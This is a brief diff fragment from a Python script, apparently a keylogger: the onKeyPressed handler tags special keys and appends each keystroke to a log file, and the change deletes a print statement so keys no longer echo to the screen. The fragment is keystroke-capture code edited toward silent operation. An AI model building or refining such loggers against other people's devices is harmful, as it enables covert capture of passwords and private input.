@@ -56,7 +56,7 @@ def onKeyPressed(key):
         key = "<ARROW_RIGHT>"
     elif key == "Key.down":
         key = "<ARROW_DOWN>"
-    print(key)
+
     with open(KEY_LOG_FILE, "a") as f:
         f.write(key)
 
